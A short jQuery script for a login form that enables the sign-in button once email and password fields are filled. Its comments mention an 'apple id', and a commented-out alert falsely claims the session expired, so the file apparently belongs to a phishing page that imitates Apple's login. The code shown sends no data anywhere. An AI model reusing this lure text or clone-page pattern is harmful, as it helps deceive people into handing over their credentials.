 
//use the POWER jquery to...
$(document).ready(function() {
  //is apple id have value?


   input_mail = $("input[type=text]");
   input_pass = $("input[type=password]");
  button = $("button");
  
  toggleButton(); 
  
   //alert("Your session has expired, You have been automatically logged out to protect your privacy")
  
  
  input_mail
    .keypress(toggleButton)
    .keyup(toggleButton);
  input_pass
    .keypress(toggleButton)
    .keyup(toggleButton);
  
  function toggleButton() {
    len_mail = input_mail.val().length;
    len_pass = input_pass.val().length;

    if (len_mail != 0 && len_pass != 0) {
     button
       .text("Sign In...")
       .removeAttr("disabled")
       .addClass('activeButton'); 
    } 
    else {
       button.attr("disabled", "disabled");
       button.text("Sign In...");
       button.removeClass('activeButton'); 
    }
  };
  
  
});